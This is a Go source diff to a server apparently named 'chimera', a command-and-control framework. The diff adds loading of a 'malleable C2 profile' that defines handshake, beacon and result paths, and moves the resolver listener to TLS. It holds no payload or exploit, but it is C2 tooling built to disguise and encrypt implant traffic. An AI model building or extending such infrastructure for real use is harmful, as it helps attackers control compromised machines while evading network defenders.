@@ -15,7 +15,15 @@ func main() {
 	keyFile := flag.String("key", "server.key", "TLS key file")
 	staticKeyFile := flag.String("static-key", "static.key", "static key file (hex)")
 	dbPath := flag.String("db", "chimera.db", "SQLite database path")
+	profilePath := flag.String("profile", "profile.json", "malleable C2 profile (JSON)")
 	flag.Parse()
+
+	// Load malleable C2 profile
+	if err := loadProfile(*profilePath); err != nil {
+		log.Fatalf("[server] failed to load profile: %v", err)
+	}
+	log.Printf("[server] profile loaded: handshake=%s beacon=%s result=%s",
+		PROFILE.Paths["handshake"], PROFILE.Paths["beacon"], PROFILE.Paths["result"])
 
 	// Open database
 	if err := openDB(*dbPath); err != nil {
@@ -41,8 +49,8 @@ func main() {
 	})
 
 	go func() {
-		log.Printf("[resolver] listening on %s", *resolverAddr)
-		if err := http.ListenAndServe(*resolverAddr, resolverMux); err != nil {
+		log.Printf("[resolver] listening on %s (TLS)", *resolverAddr)
+		if err := http.ListenAndServeTLS(*resolverAddr, *certFile, *keyFile, resolverMux); err != nil {
 			log.Fatalf("[resolver] %v", err)
 		}
 	}()
